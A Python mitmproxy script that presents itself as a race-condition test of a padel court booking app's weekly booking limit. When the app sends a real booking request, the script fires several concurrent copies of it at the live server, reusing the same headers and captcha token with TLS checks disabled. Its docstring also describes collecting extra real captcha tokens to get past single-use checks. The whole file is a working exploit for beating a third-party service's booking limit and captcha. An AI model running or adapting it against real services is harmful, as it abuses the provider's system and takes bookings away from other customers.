"""
Race-condition test for the weekly booking limit, on Padel.

Goal: see whether the server's "check remaining bookings, then write a
new booking" logic is atomic, or whether firing several real booking
requests for the SAME slot/service at (near) the same instant lets more
than weeklyLimit bookings go through.

How it works:
  - Waits for the real app to send one genuine POST /bookings/services
    for TARGET_SERVICE_ID.
  - The instant it sees that request, it fires COPIES extra copies of
    the exact same request (same headers, same captcha_token, same
    body) directly at the upstream server, all at once, using asyncio —
    not through mitmproxy's normal one-at-a-time flow handling.
  - Lets the original request continue through mitmproxy as normal.
  - Logs every response (status + body) so you can see how many came
    back "accepted" vs "limit exceeded".

Caveat: all copies reuse the SAME captcha_token as the original. If the
server validates that token as single-use/short-lived independently of
the booking-limit logic, most copies may get rejected for THAT reason
before ever reaching the limit check — which would look like "no race
bug" without actually testing the race. If you want a cleaner test,
get N real captcha_tokens from the app first (one booking attempt each,
don't let them complete) and adapt BODY/HEADERS per copy instead of
cloning a single capture.

Run with:
    mitmdump -s padel_race_condition_test.py
"""

import asyncio
import json
from mitmproxy import http, ctx

PATH = "/bookings/services"
TARGET_SERVICE_ID = None  # set to Padel's service_id
COPIES = 5  # how many extra concurrent duplicates to fire alongside the real one
FIRED = False  # only trigger once per mitmdump run; remove this guard if you want every booking attempt to trigger a burst
_BACKGROUND_TASKS = set()  # keeps strong refs so asyncio can't GC in-flight tasks


def load(loader):
	# fail loudly at startup instead of silently per-copy if httpx is missing
	try:
		import httpx  # noqa: F401
		ctx.log.info("[race] httpx import OK")
	except ImportError as e:
		ctx.log.error(f"[race] httpx is NOT installed in this environment: {e}. "
		              f"Run: pip install httpx (add --break-system-packages if needed)")


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	if req.method != "POST":
		return False
	if not req.path.split("?")[0].endswith(PATH):
		return False
	try:
		body = json.loads(req.get_text() or "{}")
	except ValueError:
		return False
	if TARGET_SERVICE_ID and body.get("service_id") != TARGET_SERVICE_ID:
		return False
	return True


async def _fire_copy(url: str, headers: dict, body_text: str, index: int):
	import httpx

	async with httpx.AsyncClient(verify=False, timeout=15) as client:
		try:
			resp = await client.post(url, content=body_text, headers=headers)
			ctx.log.info(f"[race copy {index}] status={resp.status_code} body={resp.text}")
		except Exception as e:
			ctx.log.info(f"[race copy {index}] request failed: {e}")


async def request(flow: http.HTTPFlow) -> None:
	global FIRED
	if not matches(flow) or FIRED:
		return
	FIRED = True

	url = flow.request.pretty_url
	headers = {k: v for k, v in flow.request.headers.items() if k.lower() != "content-length"}
	body_text = flow.request.get_text()

	ctx.log.info(f"[race] real request seen, firing {COPIES} concurrent duplicates at {url}")
	# fire-and-forget so the real request (handled below by mitmproxy itself)
	# isn't delayed waiting on these -- but KEEP A REFERENCE to every task,
	# otherwise asyncio can garbage-collect it before it actually runs and
	# your "copies" silently never get sent (a classic create_task footgun).
	for i in range(COPIES):
		task = asyncio.create_task(_fire_copy(url, headers, body_text, i))
		_BACKGROUND_TASKS.add(task)
		task.add_done_callback(_BACKGROUND_TASKS.discard)


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[race] ORIGINAL response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
